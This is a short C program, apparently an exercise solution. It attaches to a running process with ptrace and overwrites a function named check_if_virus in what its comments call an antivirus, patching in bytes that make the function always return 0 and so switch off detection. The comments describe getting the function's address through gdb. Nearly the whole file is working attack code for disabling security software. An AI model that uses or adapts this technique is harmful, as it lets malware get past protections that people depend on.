#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


#include <stdio.h>
#include <stdlib.h>
int pid = 0x99999999;


int main() 
{

if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
 {  // Attach to the process
  perror("attach ");
  return;
 }



int status;
waitpid(pid, &status, 0);  // Wait for the process to stop
if (WIFEXITED(status)) { return; }  // Abort if the process exits

	//address of got entry of check_if_virus:0x080485f0
	
	//check_if_virus() address
	//to receive this address, we run the antivirus with gdb, using "print check_if_virus" gives us the address
	void * addr =(void *)0xb7fd3750;
	

	//push 0;pop eax;ret (endians converted)
	long data=0xc358006a;
	//code insertion to the check_if_virus function 
	if(ptrace(PTRACE_POKETEXT, pid, addr, (void *)data))
	{
	  perror("poke");
	  return;
	}


if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) 
{  // Detach when done
  perror("detach");
  return;
}

}
